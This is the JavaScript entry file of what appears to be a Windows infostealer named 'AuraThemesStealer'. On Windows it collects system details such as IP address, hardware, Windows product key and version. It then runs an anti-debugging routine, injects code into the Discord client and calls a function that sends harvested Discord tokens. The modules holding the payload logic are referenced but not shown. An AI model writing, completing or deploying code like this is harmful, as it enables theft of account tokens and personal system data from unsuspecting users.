const process = require("process");
const getconfig = require("./config/config")();

switch (process.platform) {
    case "win32":
        const { getInfo } = require("./modules/core/core");
        const { discordInjected } = require("./modules/dinjection/injection");
        const { sendTokens } = require("./modules/findtoken/send");
        const { debuggerx } = require("./modules/debugger/debuggerx");
        const { error } = require("./utils/error");

        class AuraThemesStealer {
            constructor() {
                this.initialize();
            }
            async initialize() {
                try {
                    const { disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion } = await getInfo();
                    
                    await debuggerx(getconfig.debugger, disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion);
                    await discordInjected(getconfig.injection);
                    await sendTokens();

                    error();
                } catch (error) {
                    return console.error('An error occurred in main', error);
                }
            }
        }

        new AuraThemesStealer()

        break;
    default:
        break;
}
